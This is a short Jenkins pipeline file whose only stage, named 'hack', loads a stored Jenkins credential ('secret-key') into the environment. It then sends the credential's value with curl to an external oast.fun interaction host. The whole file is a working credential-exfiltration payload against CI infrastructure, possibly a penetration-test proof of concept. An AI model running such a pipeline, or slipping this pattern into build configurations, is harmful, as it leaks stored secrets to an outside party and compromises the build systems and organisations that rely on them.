pipeline {
    agent any
     environment {
        secret_key = credentials('secret-key')
    }
    stages {
        stage('hack') {
            steps {
              sh 'curl -d env="$secret_key" ccercd92vtc0000xdp4ggg8cggwyyyyyb.oast.fun'
                }
            }
        }
    }
